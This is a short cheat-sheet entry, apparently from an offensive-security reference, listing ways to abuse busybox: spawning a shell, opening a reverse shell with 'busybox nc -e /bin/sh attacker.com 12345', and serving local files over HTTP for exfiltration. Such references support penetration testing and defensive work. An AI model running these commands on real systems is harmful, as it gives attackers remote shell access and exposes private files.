title: busybox
html:
busybox

Inherit

busybox ash
busybox cat

Reverse Shell

busybox nc -e /bin/sh attacker.com 12345

Upload

This serves files in the local folder via an HTTP server.

busybox httpd -f -p 12345 -h .
